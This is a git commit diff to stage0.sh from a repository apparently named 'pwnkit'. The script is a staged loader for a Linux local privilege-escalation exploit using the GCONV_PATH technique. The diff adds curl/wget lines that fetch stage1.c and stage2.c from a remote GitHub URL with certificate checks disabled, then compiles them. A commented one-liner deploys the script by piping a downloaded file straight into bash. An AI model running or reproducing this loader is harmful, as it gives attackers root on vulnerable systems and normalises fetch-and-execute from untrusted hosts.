63cd44c72f08c678cc56dac942a10633c3b33be1
secw01f <16842677+secw01f@users.noreply.github.com>
2022-02-01 14:32:05 -0500

    Update stage0.sh

--- stage0.sh
+++ stage0.sh
@@ -1,11 +1,15 @@
 #!/bin/bash
 
-#command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"
+#deploy using command below, where url is the url hosting this file and C files.
 #command -v curl >/dev/null && bash -c "$(curl -fsSLk url)" || bash -c "$(wget --no-check-certificate -q0- url)"
 
 mkdir -p 'GCONV_PATH=.'
 
 echo "module UTF-8// STAGE2// stage2 2" > gconv-modules
+
+command -v curl >/dev/null && curl -fsSLk https://raw.githubusercontent.com/secw01f/pwnkit/main/stage1.c > stage1.c || wget --no-check-certificate -q0- https://raw.githubusercontent.com/secw01f/pwnkit/main/stage1.c > stage1.c
+command -v curl >/dev/null && curl -fsSLk https://raw.githubusercontent.com/secw01f/pwnkit/main/stage2.c > stage2.c || wget --no-check-certificate -q0- https://raw.githubusercontent.com/secw01f/pwnkit/main/stage2.c > stage2.c
+
 
 gcc stage1.c -Wall -fPIC -o stage1
 gcc stage2.c -Wall --shared -fPIC -o stage2.so
